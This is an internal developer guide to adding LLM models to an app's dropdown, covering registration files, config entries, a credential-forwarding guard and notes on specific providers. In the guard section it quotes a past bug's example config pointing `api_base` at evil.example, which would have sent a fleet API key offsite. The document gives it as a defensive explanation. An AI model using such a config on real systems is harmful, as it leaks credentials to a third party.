# Adding an LLM to the model dropdown

Every model offered in the UI must be registered in **five** places. Miss one and the
failure is silent rather than loud — `app/tests/test_model_registry_consistency.py`
turns each miss into a red build, and its module docstring explains each symptom.

| # | File | What to add |
|---|------|-------------|
| 1 | `app/frontend/chat.html` | `<option value="…" data-short-label="…">` inside the `data-llamabot="model-select"` select. `value` must come first — the test regex reads it positionally. |
| 2 | `app/agents/leonardo/llm_factory.py` | a `get_llm` branch building the client. No branch ⇒ silently falls through to the DeepSeek default, so the user picks one model and gets another. |
| 3 | `app/agents/leonardo/model_capabilities.py` | `{'images': …, 'video': …, 'pdf': …}`. Missing ⇒ the permissive default applies, the UI offers image upload, and a text-only provider 400s on `image_url`. |
| 4 | `app/agents/leonardo/model_policy.py` | append to `_KNOWN_MODELS`. |
| 5 | `app/routers/api.py` (`available_models`) | the required env var, or a tuple of them (first found wins). Missing ⇒ the dropdown entry is never marked available/unavailable. |

## Before you add five registrations: does it need them?

Since 0.7.7 an **OpenAI-compatible endpoint does not need any of the five** — it can be
a config entry instead (`app/agents/leonardo/openrouter_models.py`). An entry names the
endpoint, the model id and the key env, and the registry feeds the dropdown, `get_llm`,
the capability table, `_KNOWN_MODELS` and the api-key map on its own:

```json
{"models": {"some-model": {
   "label": "Some Model", "model": "vendor/some-model",
   "api_base": "https://api.some-gateway.example/v1",
   "api_key_env": "SOME_GATEWAY_API_KEY",
   "reasoning": true,
   "capabilities": {"images": false, "video": false, "pdf": false}}}}
```

Three sources, later wins: compiled-in base entries, the host overlay
(`.leonardo/openrouter_models.json`), and the mothership's pushed policy document
(`models` key) — which is what makes adding a model fleet-wide a push rather than a
release.

**Use the five-place path only when the client is genuinely different**: a first-party
SDK with knobs that are not `base_url` + `model` + a key (Anthropic's `thinking`,
Gemini's `thinking_level`, OpenAI's Responses API, Qwen's `thinking_budget`), or a
provider quirk needing real code. Ten of the twenty-four hand-written branches predate
this and could be config today.

Two things a config entry cannot do, by design:

* **Ship a credential.** `api_key_env` names a variable; the value still has to reach the
  box. A registered model with no key is greyed out, never chosen as a default.
* **Send a credential this box HOLDS to a host of the document's choosing.**
  `_key_env_allowed_at` is **default-deny**, in three cases:

  1. a key in `_FIRST_PARTY_KEY_HOSTS` may go only to its own host(s) — `api.meta.ai` +
     `META_API_KEY` is fine, that is exactly the Muse entry; an empty set (Tavily, the
     mothership token, `OPENROUTER_MANAGEMENT_API_KEY`) means never, anywhere;
  2. a key not in the map that **this box holds** is refused unless the *operator*
     overlay declares a host for it (`{"key_hosts": {"MOONSHOT_API_KEY":
     ["api.moonshot.ai"]}}`). The pushed document may not declare this — it would be
     granting itself the trust the guard withholds — and `model_policy_store`
     `_ALLOWED_KEYS` drops the key before it is ever stored;
  3. a key the box does **not** hold is allowed anywhere: staging a provider ahead of
     its credential leaks nothing and 401s honestly. The moment an operator adds the
     key, case 2 takes over.

  `SHARED_<NAME>` is canonicalised to `<NAME>` first, because the provisioner writes
  every secret twice and two map entries would drift.

  **The first cut of this guard was an allowlist keyed on key NAME, and it was wrong.**
  Anything unnamed was allowed anywhere — including `OPENROUTER_API_KEY`, which is the
  *default* `api_key_env`, so `{"model": "x", "api_base": "https://evil.example/v1"}`
  with no key field at all shipped the fleet key offsite. Read live off llamapress-dev
  the same day, the map was also missing `OPENROUTER_MANAGEMENT_API_KEY`,
  `BEDROCK_API_KEY`, `GMI_DEEPSEEK_API_KEY`, `GROUND_ROUTE_SEARCH_API_KEY`,
  `TAVILY_API_KEY` and `LLAMAPRESS_AI_LOGIN_SECRET`. Don't reintroduce a name list as
  the boundary; "does this box hold it" needs no list and cannot drift.

## Third-party OpenAI-compatible endpoints

Most non-OpenAI providers (GMI, Fireworks, Alibaba, Meta) speak OpenAI-compatible
chat completions, so the client is just `ChatOpenAI` (or `ChatDeepSeek`/`ChatQwen`)
with `base_url` overridden. Two rules:

**1. Never pass a bare `api_key=os.getenv("PROVIDER_KEY")`. Use
`llm_factory.provider_key("PROVIDER_KEY", …)`.**

All of these clients sit on the `openai` SDK, and that SDK falls back to
`OPENAI_API_KEY` from the environment when handed `api_key=None`. With `base_url`
pointed at a third party, an instance that has `OPENAI_API_KEY` but not the
provider's key would send our OpenAI secret in an `Authorization: Bearer` header
**to that provider**. `provider_key` returns a dud placeholder instead, turning a
credential disclosure into an honest 401. Pinned by
`app/tests/test_provider_key_never_leaks_openai.py` — add new endpoints to its
parametrize list.

**2. The system prompt must be flattened.** These gateways require system `content`
to be a plain string and 400 on Anthropic's cache-control block list. That is
already handled centrally: `supports_prompt_caching()` returns False for any
non-Anthropic name, and `system_message_for_model()` flattens accordingly. Don't
re-derive either check at a call site.

## Registering a model is not the same as enabling it

All five registrations can be correct and the model still never runs. `model_policy`
resolves an **allow-list**, and the allow sources **intersect**: `.leonardo/instance.json`
`enabled_models` ∩ `ENABLED_MODELS`. A model absent from either is swapped for the box
default inside `get_llm`, so the dropdown keeps showing the user's pick while every turn
runs on something else. On the dev box, `instance.json` carries a real `enabled_models`
list — add the new name there (`~/dev/Leonardo/.leonardo/instance.json`, read per request,
no restart needed) or nothing you added will be reachable.

The symptom is one log line per turn:

```
WARNING - Requested model 'x' is disabled by policy; using 'muse-spark-1.2-contributor' instead.
```

Since 0.7.0e that substitution also raises a `model_substituted` websocket frame, shown as
a banner above the composer — check the UI before digging through logs. Fleet-wide the
allow-list is mothership-owned, so a model that ships in the dropdown but not in
`enabled_models` is invisible on every real box.

## Verifying on the dev box

`MODEL_SWITCHING_ALLOWED` defaults to False and is unset in the container, so
`get_llm` replaces any non-default model with DeepSeek. Probe with it set,
otherwise you are inspecting a DeepSeek client and won't notice:

```bash
docker exec -e MODEL_SWITCHING_ALLOWED=true -e PROVIDER_API_KEY=test \
  leonardo-llamabot-1 sh -c 'cd /app && python -c "
from app.agents.leonardo.llm_factory import get_llm
m = get_llm(\"your-model\")
print(type(m).__name__, m.model_name, m.openai_api_base)"'
```

## Notes on specific entries

- **`muse-spark-1.2-contributor`** (Meta) — the tier lives entirely in the model id.
  `muse-spark-1.2` is $1.25/$4.25 per 1M tokens and is not trained on;
  `muse-spark-1.2-contributor` is $0.10/$0.20 and licenses Meta to train on every
  prompt and completion sent to it, including customer application code. We ship the
  contributor id deliberately; an operator can move a single instance to the paid,
  non-training tier with `META_MUSE_MODEL=muse-spark-1.2`, no code change. Note this
  is the opposite trade from `deepseek-v4-flash-fireworks`, which exists precisely to
  keep customer code out of a third party's training data — so don't make Muse a
  fleet default without revisiting that decision. Key: `META_API_KEY` (Meta's docs
  call it `MODEL_API_KEY`; both are accepted).

  **Muse shows no thinking tokens, and that is Meta's behavior, not our bug.** The
  API reasons and bills for it (`usage` reports 250–700 `reasoning_tokens` on small
  prompts) but never returns the reasoning text. Verified 2026-08-08 against the
  live API on all four paths: chat completions returns a message with only
  `content`/`role` and no `reasoning_content` field; the Responses API returns a
  `reasoning` item with `summary: []`, `content: null` and no `encrypted_content`,
  under `summary` of `auto`, `detailed` **and** `concise`; the streaming deltas carry
  only `content`/`role`; and the standard `muse-spark-1.2` tier behaves identically
  to the contributor tier. So there is nothing for `request_handler`'s extractor to
  pick up — do not "fix" it by adding a reasoning shape for Meta, and don't reach for
  `use_responses_api=True` expecting summaries the way the GPT-5 entries get them.

- **`muse-spark-1.3-contributor`** (Meta, released 2026-09-02) — a **sibling** of the
  1.2 entry, not a re-point of it. 1.2 is the compiled fleet default, sits in
  `_FAIL_OPEN_MODELS`, and is named in pushed policies and in boxes' `enabled_models`;
  swapping the id under that name would move the fleet onto an unmeasured model in a
  release with no operator route back. Same endpoint, same `META_API_KEY`, same price
  and same tier split as 1.2 ($0.10/$0.20 contributor / $1.25/$4.25 standard, the tier
  encoded only in the id), same reasoning modes, 1M context. Meta reports ~20% fewer
  tool calls and ~25% fewer tokens than 1.2 on the same agentic work.

  The per-box id override is **`META_MUSE_1_3_MODEL`, not `META_MUSE_MODEL`**. Boxes
  that moved off the training tier already carry `META_MUSE_MODEL=muse-spark-1.2`;
  sharing the variable would make picking 1.3 on one of those boxes silently run 1.2 —
  a compliance override turning into a model downgrade. Pinned by
  `test_muse_13_has_its_own_id_override_env_var`.

  **Not reachable on our Meta account as of 2026-09-03.** `GET https://api.meta.ai/v1/models`
  with our key returns only `muse-image-1.0`, `muse-spark-1.2-contributor`,
  `muse-spark-1.2`, `muse-spark-1.1`, and a chat completion against the 1.3 id returns
  `404 model_not_found`. The registration is still correct and deliberately shipped: it
  costs nothing, needs no re-release when access lands, and the 0.7.7 resilience ladder
  already treats a 404 `model_not_found` as "gone" — one cheap 404, then a fallback, and
  `model_health` keeps subsequent turns off it for the TTL. Re-run the `/v1/models` check
  before assuming it is still unavailable.

- **`nemotron-lightning-30b-fireworks`** — the same weights as the self-hosted
  `nemotron-lightning-30b-runpod`, on Fireworks serverless, and a sibling entry rather
  than a re-point of it. Verified live 2026-08-16: Fireworks returns Nemotron's thinking
  in a separate `reasoning_content` field (streamed as deltas, and accepted back on
  assistant messages), so it uses `ChatDeepSeekWithReasoning` — a bare `ChatOpenAI`
  would drop the thinking. It sets **no** `max_tokens`: reasoning bills against that cap
  while being stripped from the response, so a small cap returns empty content with no
  error, and Fireworks imposes no small default of its own. Key: `FIREWORKS_API_KEY`,
  falling back to the `FIREWORKS_DEEPSEEK_API_KEY` name already deployed on boxes (one
  Fireworks account issues one key, so a per-model key name would be fiction).

- **`qwen3.8-27b-hetzner`** — Qwen3.8-27B (dense) on **Hetzner's Inference API**
  (`https://inference.hetzner.com/api/v1`), an EU-hosted OpenAI-compatible gateway, so
  the client is a plain `ChatOpenAI` with an overridden `base_url` — not `ChatQwen`,
  which exists for Alibaba DashScope's reasoning shape. Key: `HETZNER_API_KEY`.
  262k context, text + image in. Hetzner serves a small, changing set of models and
  `/v1/models` is the definitive list; `HETZNER_QWEN_MODEL` re-points this entry to
  their other one (`Qwen/Qwen3.6-35B-A3B-FP8`, MoE, 35B total / 3B active, same context
  and modalities) with no code change, and `HETZNER_BASE_URL` overrides the endpoint.

  **The rate limit is on requests, not tokens: 10 per 60s per key** (against 4M in /
  100k out tokens per 60s). One agentic Leo turn is many sequential requests, so a
  single busy user can exhaust it. 429s are classified transient and retried by the
  resilience middleware, so they surface as slow turns rather than failed ones — but
  it is why this must not become a fleet default while the API is free/experimental.

  Not yet verified against the live endpoint (no `HETZNER_API_KEY` on the dev box as
  of 2026-08-30). Two things to check on first use: whether tool calling works at all
  through their vLLM serve flags, and whether thinking arrives inline as
  `<think>…</think>` inside `content` — if it does, `chat_template_kwargs=
  {"enable_thinking": False}` (as on the RunPod Qwen3-8B entry) is the first knob.
